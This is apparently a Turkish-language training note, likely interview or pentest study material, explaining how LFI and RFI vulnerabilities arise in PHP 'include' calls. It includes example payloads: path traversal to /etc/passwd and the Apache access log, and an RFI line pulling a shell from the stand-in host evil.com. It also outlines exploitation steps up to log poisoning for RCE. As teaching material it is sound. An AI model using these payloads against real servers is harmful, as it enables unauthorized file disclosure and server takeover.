# 📌 2-File Inclusion Açıklarının Temel Mantığı  

File Inclusion zafiyetleri, web uygulamalarının kullanıcı tarafından verilen parametreleri doğrudan **dosya dahil etme** fonksiyonlarında kullanması sonucu ortaya çıkar. Bu açıklar özellikle **PHP** tabanlı uygulamalarda yaygındır çünkü `include`, `require`, `include_once`, `require_once` fonksiyonları dinamik parametrelerle çağrıldığında güvenlik riskine yol açar.  

Bu bölümde **LFI (Local File Inclusion)** ve **RFI (Remote File Inclusion)** açıklarının temel mantığını, yaygın kullanım alanlarını ve bu açıkların doğurabileceği riskleri ele alacağız.  

---

## 📌 LFI (Local File Inclusion) Mantığı  

**Tanım:**  
LFI, saldırganın uygulamaya dahil edilen dosya parametresini manipüle ederek **sunucu üzerindeki yerel dosyalara erişim sağlamasıdır**.  

**Örnek Senaryo:**  
Varsayılan uygulama:  
`index.php?page=home.php`  

Saldırgan denemesi:  
`index.php?page=../../../../etc/passwd`  

**Mantık:**  
- Parametre değerleri doğrulanmazsa, saldırgan işletim sistemindeki hassas dosyaları okuyabilir.  
- Path traversal (`../`) teknikleri ile üst dizinlere çıkılarak kritik dosyalara erişim sağlanır.  
- Bazı durumlarda log poisoning gibi yöntemlerle RCE (Remote Code Execution) elde edilebilir.  

**Riskler:**  
- Sensitive data exposure (config dosyaları, şifreler, API anahtarları)  
- RCE’ye zemin hazırlama  
- Sunucu yapılandırmasının ifşası  

---

## 📌 RFI (Remote File Inclusion) Mantığı  

**Tanım:**  
RFI, saldırganın uygulamanın include fonksiyonunu kullanarak **uzak bir kaynaktan dosya dahil etmesini** sağlar.  

**Örnek Senaryo:**  
Varsayılan uygulama:  
`index.php?page=home.php`  

Saldırgan denemesi:  
`index.php?page=http://evil.com/shell.txt`  

**Mantık:**  
- Eğer `allow_url_include=On` ve `allow_url_fopen=On` ise, saldırgan uzak bir kaynaktan PHP kodunu dahil edip çalıştırabilir.  
- Bu durum doğrudan **uzaktan kod çalıştırma (RCE)** ile sonuçlanır.  

**Riskler:**  
- Web shell veya backdoor yüklenmesi  
- Zararlı yazılım dağıtımı  
- Sunucunun ele geçirilmesi  

---

## 📌 Yaygın Kullanım Alanları  

1. **Dinamik Sayfa Yükleme:**  
Uygulamalar, kullanıcıların menü seçimleri veya sayfa parametreleriyle dosya yüklemelerine izin verebilir.  
`index.php?page=contact.php`  

2. **Tema / Template Sistemleri:**  
CMS veya blog yazılımlarında kullanıcı temelli dosya çağırma mekanizması vardır.  

3. **Dil / Localization Dosyaları:**  
Çoklu dil desteği için parametreyle dosya çağrılması (ör: `lang=en.php`).  

4. **Log ve Konfigürasyon Okuma:**  
Debug veya admin panellerinde dosya parametreleri kontrolsüz kullanılabilir.  

---

## 📌 Örnek Payloadlar  

- LFI:  
  `/index.php?page=../../../../etc/passwd`  
  `/index.php?page=../../../../var/log/apache2/access.log`  

- RFI:  
  `/index.php?page=http://evil.com/shell.txt`  

---

## 📌 Kullanım (Pentester Açısından)  

1. **Keşif:** URL parametrelerinde `page=`, `file=`, `doc=`, `lang=` gibi değerler aramak.  
2. **Deneme:** Path traversal (`../`) veya uzak URL parametreleriyle test etmek.  
3. **İstismar:** Hassas dosya okuma veya zararlı kod çalıştırma.  
4. **Genişletme:** LFI ile log poisoning yaparak RCE elde etme.  

---

## 📌 Sonuç  

File Inclusion açıklarının temel mantığı, **kullanıcı girdisinin kontrolsüz bir şekilde dosya dahil etme fonksiyonlarına verilmesidir**.  

- **LFI:** Yerel dosya erişimi → Hassas veri sızması veya RCE  
- **RFI:** Uzak dosya dahil etme → Doğrudan RCE ve sunucu ele geçirme  

Bir mülakatta, adaydan bu açıkların nasıl keşfedildiğini, istismar edildiğini ve önlenmesi için hangi adımların atılabileceğini açıklaması beklenir.  

👉 **Kritik Nokta:** File Inclusion, basit bir dosya okuma açığından tüm sunucunun ele geçirilmesine kadar gidebilen ciddi bir güvenlik riskidir.  
